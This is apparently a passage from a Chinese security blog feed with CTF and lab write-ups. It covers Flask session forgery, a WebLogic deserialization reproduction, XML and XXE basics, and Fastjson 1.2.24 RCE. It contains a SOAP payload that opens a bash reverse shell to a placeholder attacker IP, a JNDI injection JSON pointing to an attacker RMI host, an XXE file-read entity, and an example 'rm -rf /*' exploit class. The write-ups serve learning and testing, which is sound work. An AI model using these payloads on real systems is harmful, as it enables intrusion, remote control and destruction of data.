<h3 id="3-flask的session格式"><a href="#3-flask的session格式" class="headerlink" title="3.flask的session格式"></a>3.flask的session格式</h3><p>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure>

<p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p>
<p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p>
<h3 id="4、flask-session伪造"><a href="#4、flask-session伪造" class="headerlink" title="4、flask session伪造"></a>4、flask session伪造</h3><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p>
<p>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<h2 id="ISCTF2024【小蓝鲨的故事】"><a href="#ISCTF2024【小蓝鲨的故事】" class="headerlink" title="ISCTF2024【小蓝鲨的故事】"></a>ISCTF2024【小蓝鲨的故事】</h2><p>就是一个简单的session伪造 </p>
<p>页面就是一个简单的重定向</p>
<p>然后用dirsearch 扫描发现两个&#x2F;robots.txt &#x2F;flag</p>
<p>直接进入&#x2F;flag 发现是进不去的 &#x2F;robots.txt 可以发现 有东西 结合提示 发现这就是key </p>
<p>那么 &#x2F;flag 可以看到cookie 存储的是session</p>
<p>key:SAVPiEkH</p>
<p>cookie:eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw</p>
<p>我们利用flask-session-cookie-manager</p>
<p>先将 这段session 解码 发现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw&#x27; -s &#x27;SAVPiEkH&#x27;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>得到{‘username’: b’www-data’}</p>
<p>但是不知道要怎么伪造成什么   admin  root 都试过了当时做题卡在这 </p>
<p>最后看wp 发现有一个&#x2F;Hacker</p>
<p>显示他叫ISctf_Hacker</p>
<p>。。dirsearch 没有这个字典 (｡･∀･)ﾉﾞ嗨</p>
<p>我们伪造成ISctf_Hacker 即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s&#x27;SAVPiEkH&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;ISctf_Hacker&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</span><br></pre></td></tr></table></figure>

<p>eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</p>
<p>将这个传入 &#x2F;flag 的cookie 得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCTF&#123;8534881b-b09d-4811-9da2-40695b41c158&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h2><p>给了一个登录界面 尝试 admin  弱口令爆破 没成功</p>
<p>然后 就看了下cookie 发现有session 那就直接找key</p>
<p>题目给了一个附件 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&quot;SECRET_KEY&quot;] = &quot;W3l1com_isCTF&quot;</span><br></pre></td></tr></table></figure>

<p>直接给了</p>
<p>我们解码看下是个啥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.Zzr02A.cbGkQjMXcWrkDVwMdM77W1k-KBI&#x27; -s &#x27;W3l1com_isCTF&#x27;       </span><br><span class="line">&#123;&#x27;login_error&#x27;: True, &#x27;password&#x27;: &#x27;test111&#x27;, &#x27;status&#x27;: &#x27;user&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>只是个登录报错 还得审计下附件给的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>审计代码可以发现我们只要 伪造admin 就会重定向到 &#x2F;admin 这个路由</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;password&#x27;: &#x27;admin222&#x27;, &#x27;status&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; -s &quot;W3l1com_isCTF&quot;</span><br><span class="line"></span><br><span class="line">.eJyrVipILC4uzy9KUbJSSkzJzcwzMjJS0lEqLkksKS2GiQEFSotTi_ISc1PhQrUAUyMTvw.Zzv_wA.FVJA55ixFNYaH2_r_-uxCrZqN4U</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后访问这个路由&#x2F;admin 发现进入后台 然后还得继续审计代码 后面的内容就是 反序列化的内容 </p>
<p>放在其他地方讲</p>
<p>总之session 伪造 首先 看cookie 是不是传入的session 其次 需要 给的密钥 然后 根据需求 需要伪造成什么 应该差不多就是这样了</p>
]]></content>
      <categories>
        <category>session</category>
      </categories>
      <tags>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic反序列化复现</title>
    <url>/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p>
<p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p>
<h4 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h4><p>Oracle WebLogic Server 10.3.6.0.0版本，12.1.3.0.0版本，12.2.1.1.0版本，12.2.1.2.0版本</p>
<p><strong>构造如下Payload：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/攻击IP/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用burp进行抓包 请求头中添加以下字段：</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">SOAPAction:</span></span><br><span class="line"><span class="section">Content-Type:text/xml</span></span><br></pre></td></tr></table></figure>

<p><strong>写入准备好的payload POST方式发送即可</strong></p>
<p>nc 监听1234端口反弹shell</p>
<h1 id="Weblogic命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic命令执行漏洞（CVE-2018-2628）"></a>Weblogic命令执行漏洞（CVE-2018-2628）</h1><h4 id="漏洞咋产生的？"><a href="#漏洞咋产生的？" class="headerlink" title=".漏洞咋产生的？"></a><strong>.漏洞咋产生的？</strong></h4><p>漏洞的核心是<strong>WebLogic处理T3协议数据时的“无脑拆包”机制</strong>。T3协议是WebLogic默认开启的通信协议，用于服务器和Java程序之间的数据传输。但它在解析数据时，会直接对序列化数据（类似打包的快递）进行反序列化（拆包），而<strong>没有严格检查包裹里是否有危险物品</strong>（恶意代码）</p>
<p><strong>T3协议默认开放</strong>：WebLogic的7001端口默认开启T3服务，相当于给黑客留了个后门</p>
<p><strong>反序列化黑名单不全</strong>：之前Oracle通过黑名单拦截危险类（比如<code>java.rmi.registry.Registry</code>），但攻击者换了个接口（如<code>java.rmi.activation.Activator</code>），就绕过了检查</p>
<p><strong>依赖危险库</strong>：WebLogic使用了存在漏洞的Apache Commons Collections库，黑客可通过这个库触发代码执行</p>
<h4 id="攻击步骤拆解"><a href="#攻击步骤拆解" class="headerlink" title="攻击步骤拆解"></a><strong>攻击步骤拆解</strong></h4><p><strong>分四步走</strong>：</p>
<ol>
<li><p><strong>第一步：搭“指挥中心”（JRMP Server）</strong></p>
<ul>
<li>攻击者在自己电脑上开个<strong>“指挥中心”</strong>（JRMP监听服务），等着服务器主动联系。</li>
<li><em>相当于黑客建了个秘密电台，准备发号施令。</em></li>
</ul>
</li>
<li><p><strong>第二步：伪造“通行证”（构造Payload）</strong></p>
<ul>
<li><p>用工具生成一个</p>
<p>“假通行证”</p>
<p>（Payload），里面写着：</p>
<ul>
<li><em>“指挥中心”地址（攻击者IP和端口）。</em></li>
<li><em>“见到指挥中心后，按它的指令办事！”</em></li>
</ul>
</li>
<li><p><em>这个通行证本质是一串伪装成正常数据的代码，但暗藏玄机。</em></p>
</li>
</ul>
</li>
<li><p><strong>第三步：快递“炸弹”（发送Payload）</strong></p>
<ul>
<li>通过WebLogic的<strong>T3快递通道</strong>（7001端口），把假通行证寄给服务器。</li>
<li><em>因为T3通道默认开放且安检不严，包裹顺利送达。</em></li>
</ul>
</li>
<li><p><strong>第四步：引爆“炸弹”（触发漏洞）</strong></p>
<ul>
<li>服务器拆开包裹（反序列化Payload），发现要联系“指挥中心”。</li>
<li>服务器主动连接攻击者的JRMP监听服务，<strong>“指挥中心”立刻下发最终指令</strong>（比如：“执行命令<code>rm -rf /*</code>删库”）。</li>
<li><em>此时服务器完全被控制，攻击者想干啥就干啥。</em></li>
</ul>
</li>
</ol>
<p><strong>T3协议</strong>：WebLogic的专属快递通道，默认开放且效率高，但安检不严</p>
<p><strong>RMI绕过黑名单</strong>：Oracle用黑名单拦截已知危险类，但攻击者改用RMI协议的其他接口（如<code>Activator</code>），换汤不换药绕过了检查</p>
<p><strong>反序列化漏洞</strong>：服务器无脑拆包裹（<code>readObject</code>方法），把恶意代码当正常指令执行</p>
<p><strong>JRMP协议</strong>：攻击者用JRMP监听服务做“远程指挥”，让服务器主动连接并接收攻击指令</p>
<p>攻击就是利用CVE-2018-2628漏洞工具包(检测工具在其中)</p>
<p>首先有一个监测工具需要将txt文件改成目标及ip检测</p>
<p>检测成功之后</p>
<p>利用ysoserial去生成payload然后启动JRMP的监听</p>
<p>然后利用工具伪造payload 反弹shell到我的攻击机</p>
<p>染红通过T3通道把payload传递给服务器进行反序列化解析连接jRMP建立通讯</p>
<p>然后JRMP发送反弹shell 的命令，拿下攻击机</p>
]]></content>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe漏洞</title>
    <url>/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h3><p><a href="https://so.csdn.net/so/search?q=XML%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">XML文档</a>结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>大白话解释下</p>
<h3 id="大白话版XML基础讲解"><a href="#大白话版XML基础讲解" class="headerlink" title="大白话版XML基础讲解"></a><strong>大白话版XML基础讲解</strong></h3><hr>
<h4 id="1-XML是啥？"><a href="#1-XML是啥？" class="headerlink" title="1. XML是啥？"></a><strong>1. XML是啥？</strong></h4><p>XML全称<strong>可扩展标记语言</strong>，你可以把它理解成一种<strong>“纯文本版的数据收纳盒”</strong>。它的核心作用是<strong>存储和传输结构化的数据</strong>，比如商品信息、用户资料等。举个栗子🌰：</p>
<ul>
<li><strong>HTML</strong>（网页语言）：负责把数据排版成好看的页面，比如字体颜色、表格布局。</li>
<li><strong>XML</strong>：只关心数据本身长啥样，比如一个商品的名字、价格、库存量。</li>
</ul>
<blockquote>
<p>📌 <strong>关键特点</strong>：标签可以自定义（比如 <code>&lt;手机型号&gt;小米13&lt;/手机型号&gt;</code>），不像HTML只能用固定标签（如 <code>&lt;p&gt;</code>）</p>
<p><strong>1</strong></p>
<p><strong>3</strong></p>
<p><strong>5</strong></p>
<p>。</p>
</blockquote>
<hr>
<h4 id="2-XML长什么样？"><a href="#2-XML长什么样？" class="headerlink" title="2. XML长什么样？"></a><strong>2. XML长什么样？</strong></h4><p>XML文档就像<strong>家谱</strong>，必须有一个<strong>“老祖宗”根标签</strong>，其他标签层层嵌套。比如：</p>
<p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  <span class="comment">&lt;!-- 文档声明（告诉电脑这是XML） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">超市</span>&gt;</span>  <span class="comment">&lt;!-- 根标签 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">商品</span> <span class="attr">分类</span>=<span class="string">&quot;饮料&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 子标签，带属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">名称</span>&gt;</span>可乐<span class="tag">&lt;/<span class="name">名称</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">价格</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">价格</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">库存</span>&gt;</span>100<span class="tag">&lt;/<span class="name">库存</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">商品</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">超市</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><?xml version="1.0" encoding="UTF-8"?>  <!-- 文档声明（告诉电脑这是XML） -->
&lt;超市&gt;  <!-- 根标签 --><br>  &lt;商品 分类&#x3D;”饮料”&gt;  <!-- 子标签，带属性 --><br>&lt;名称&gt;可乐&lt;&#x2F;名称&gt;<br>&lt;价格&gt;3.5&lt;&#x2F;价格&gt;<br>&lt;库存&gt;100&lt;&#x2F;库存&gt;<br>  &lt;&#x2F;商品&gt;<br>&lt;&#x2F;超市&gt;</li>
</ul>
<hr>
<h4 id="3-XML的规矩（语法）"><a href="#3-XML的规矩（语法）" class="headerlink" title="3. XML的规矩（语法）"></a><strong>3. XML的规矩（语法）</strong></h4><p>3.XML的规矩 (语法)<br>1.严格大小写：<Price>和<price>是俩不同的标签，电脑会认错68。<br>2.不能瞎起名：<br>）×不能用数字开头（如1&lt;1号商品&gt;<br>·×不能有空格（如&lt;商品名称&gt;）<br>·×别用特殊符号（如：或-）<br>3.躲开特殊字符：比如&lt;要写成&amp;lt；，否则电脑会以为是新标签。<br>4.注释写法：<!--这是注释-->，不能嵌套。</p>
<hr>
<h4 id="4-XML能干啥用？"><a href="#4-XML能干啥用？" class="headerlink" title="4. XML能干啥用？"></a><strong>4. XML能干啥用？</strong></h4><p>1. </p>
<p>   传数据</p>
<p>   ：比如APP和服务器之间传订单信息，用XML打包数据，双方都能看懂</p>
<p>   <strong>3</strong></p>
<p>   <strong>7</strong></p>
<p>   。</p>
<p>2. </p>
<p>   当配置文件</p>
<p>   ：很多软件的设置文件（比如Java的Spring框架）用XML存参数</p>
<p>   <strong>3</strong></p>
<p>   <strong>8</strong></p>
<p>   。</p>
<p>3. </p>
<p>   小型数据库</p>
<p>   ：比如存几百本书的信息，方便随时读取</p>
<p>   <strong>3</strong></p>
<p>   <strong>4</strong></p>
<p>   。</p>
<p>4. </p>
<p>   规范数据格式</p>
<p>   ：比如电商平台要求所有商家用统一的XML格式上传商品</p>
<p>   <strong>4</strong></p>
<p>   <strong>7</strong></p>
<p>   。</p>
<hr>
<h4 id="5-举个实际例子"><a href="#5-举个实际例子" class="headerlink" title="5. 举个实际例子"></a><strong>5. 举个实际例子</strong></h4><p>假设你要用XML存学生信息：</p>
<p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">班级</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>18<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>90<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>19<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>85<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">班级</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>根标签</strong>：<code>&lt;班级&gt;</code></li>
<li><strong>嵌套结构</strong>：每个学生信息包裹在 <code>&lt;学生&gt;</code> 里，属性 <code>学号</code> 区分不同学生</li>
</ul>
<p><strong>XML &#x3D; 自定义标签 + 结构化数据 + 严格语法</strong>。它像一张万能表格，能把杂乱的数据整理得井井有条，方便电脑和人一起看懂。学XML的重点是：<strong>标签别写错、属性加引号、结构要清晰</strong>！</p>
<h5 id="xml语言的格式"><a href="#xml语言的格式" class="headerlink" title="xml语言的格式"></a>xml语言的格式</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   //xml的声明  </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span>                                      //DTD部分</span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span>                          //xml部分</span><br></pre></td></tr></table></figure>

<p>首先第一句是声明，声明这是一段xml代码，接下来是一个DTD的部分，意思是读取d盘上的1.txt文件。比如我们经常要用到某一组数据，那么每次都引用，肯定是非常不方便的，所以把这组经常用的数据设置成为一个变量，需要的时候直接调用这个变量，通过以上的解释，我们不难看出，xml如果产生漏洞，那肯定就是在这个DTD部分，最后则是xml部分。</p>
<p>一道java题目结合xxe漏洞</p>
<h5 id="CVE-2019-12415"><a href="#CVE-2019-12415" class="headerlink" title="CVE-2019-12415"></a>CVE-2019-12415</h5><p>之前刷题网鼎杯碰到的 顺便复习了下xxe（外部实体注入漏洞）</p>
]]></content>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>“fastjson初探”</title>
    <url>/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</url>
    <content><![CDATA[<h1 id="Fastjson1-2-24-RCE漏洞"><a href="#Fastjson1-2-24-RCE漏洞" class="headerlink" title="Fastjson1.2.24-RCE漏洞"></a>Fastjson1.2.24-RCE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。</p>
<p> 漏洞原理 </p>
<p>再用Fastjson解析JSON数据的时候</p>
<p>假如攻击者伪造一段特殊的的恶意的JSON数据 </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://黑客仓库/危险物品&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里面攻击者伪造了@type标签 需要用com.sun.rowset.JdbcRowSetImpl（指定反序列化类）进行处理 </p>
<p>这个jdbcRowSetlmpl 我们理解为分拣员 那么 分拣员记录下“需要联系黑客仓库的指令”</p>
<p>autoCommit”: true则会触发setAutoCommit()方法 相当于让jdbcRowSetlmpl立即执行</p>
<p>然后我们就进行恶意仓库的连接（JNDL注入）</p>
<p>分拣员（jdbcRowSetlmpl）就会根据rmi:&#x2F;&#x2F;黑客仓库&#x2F;危险物品地址拨打电话（发起JNDL请求）而黑客仓库（攻击者搭建二点RMI服务器）就会回应</p>
<p>“请到http:&#x2F;&#x2F;恶意站点&#x2F;Exploit.class领取包裹”</p>
<p><strong>加载“危险物品”（远程代码执行）</strong></p>
<p>快递公司系统（JVM）从恶意站点下载的Exploit.class并自动拆包执行其中的代码。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class 静态代码块</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// 删除服务器数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

